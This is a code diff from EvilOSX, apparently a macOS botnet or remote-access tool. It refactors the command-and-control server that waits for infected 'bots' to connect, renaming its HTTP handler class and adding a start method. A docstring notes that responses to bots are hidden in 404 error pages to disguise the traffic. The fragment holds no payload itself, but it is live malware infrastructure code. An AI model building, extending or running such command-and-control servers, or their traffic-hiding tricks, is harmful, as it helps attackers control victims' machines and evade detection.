@@ -31,12 +31,14 @@ class Controller:
 
         self._connected_bot = None
 
-        # View startup
-        self._view.set_header_text("EvilOSX v{} | Port: {} | Available bots: 0".format(VERSION, server_port))
+    def start(self):
+        """Start the view and request handler."""
+        self._view.set_header_text("EvilOSX v{} | Port: {} | Available bots: 0".format(VERSION, self._server_port))
         self._view.output("Server started, waiting for connections...", "info")
         self._view.output("Type \"help\" to show the help menu.", "info")
 
         self._register_listeners()
+        self._view.start()
         self._start_server()
 
     def _register_listeners(self):
@@ -45,12 +47,12 @@ class Controller:
 
     def _start_server(self):
         """Starts the server which communicates with bots (in a separate thread)."""
-        # Via __init__ is an absolute pain...
-        BotController._model = self._model
-        BotController._view = self._view
-        BotController._server_port = self._server_port
+        # A new instance of the RequestHandler is created for every request.
+        RequestHandler._model = self._model
+        RequestHandler._view = self._view
+        RequestHandler._server_port = self._server_port
 
-        server_thread = Thread(target=ThreadedHTTPServer(('', self._server_port), BotController).serve_forever)
+        server_thread = Thread(target=ThreadedHTTPServer(('', self._server_port), RequestHandler).serve_forever)
         server_thread.daemon = True
         server_thread.start()
 
@@ -232,7 +234,7 @@ class Controller:
             self._view.output("Type \"modules\" to get a list of available modules.", "attention")
 
 
-class BotController(BaseHTTPRequestHandler):
+class RequestHandler(BaseHTTPRequestHandler):
     """Handles communicating with bots.
 
     - Responses are hidden in 404 error pages (the DEBUG part)
